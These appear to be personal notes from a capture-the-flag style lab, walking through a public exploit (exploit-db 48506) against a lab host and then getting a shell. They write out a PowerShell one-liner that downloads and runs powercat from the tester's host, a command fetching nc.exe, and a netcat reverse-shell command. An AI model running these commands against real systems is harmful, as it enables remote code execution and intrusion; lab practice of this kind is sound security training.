Using the public exploit 

- searchsploit
```bash
searchsploit -m 48506
```
- Run the python script against the base URL
```bash
python2 48506.py http://10.10.10.198:8080/
```
![[Pasted image 20240908110954.png]]

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.7/powercat.ps1');powercat -c 10.10.14.7 -p 443 -e powershell"
```

Unfortunately, this is a webshell and not a full reverse shell

- Transferred over nc.exe to base folder
![[Pasted image 20240908120310.png]]
```powershell
powershell.exe -c "iwr -uri http://10.10.14.7/nc.exe -Outfile nc.exe"
```
- Confirm that file has been uploaded
![[Pasted image 20240908120439.png]]
- Got a reverse shell using
```powershell
nc.exe 10.10.14.7 443 -e cmd.exe
```